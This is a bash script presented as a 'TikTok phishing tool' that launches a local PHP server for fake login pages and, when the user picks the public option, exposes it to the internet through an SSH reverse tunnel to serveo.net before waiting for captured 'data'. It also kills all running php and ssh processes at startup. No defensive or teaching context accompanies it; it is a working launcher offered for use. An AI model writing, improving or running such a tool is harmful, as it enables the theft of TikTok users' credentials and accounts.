#!/bin/bash
# Waseem Hacker Advanced Script

killall php > /dev/null 2>&1
killall ssh > /dev/null 2>&1

clear
echo "####################################"
echo "#       TIKTOK PHISHING TOOL       #"
echo "#        Created by Waseem Hacker  #"
echo "####################################"
echo ""
echo "[1] TikTok"
echo "[2] Exit"
echo ""
read -p "Select an option: " opt1

if [ $opt1 == 1 ]; then
    clear
    echo "####################################"
    echo "#         SELECT SERVER            #"
    echo "####################################"
    echo "[1] Localhost"
    echo "[2] Serveo (Public Link)"
    echo ""
    read -p "Select Server: " opt2

    if [ $opt2 == 1 ]; then
        echo "[*] Starting Localhost..."
        php -S 127.0.0.1:8080 -t pages/
    elif [ $opt2 == 2 ]; then
        echo "[*] Starting Server and Tunneling..."
        php -S 127.0.0.1:8080 -t pages/ > /dev/null 2>&1 &
        ssh -R 80:127.0.0.1:8080 serveo.net
    fi

    echo "[*] Waiting for data..."
    sleep 9999

elif [ $opt1 == 2 ]; then
    echo "Exiting..."
    exit
else
    echo "Invalid option!"
fi
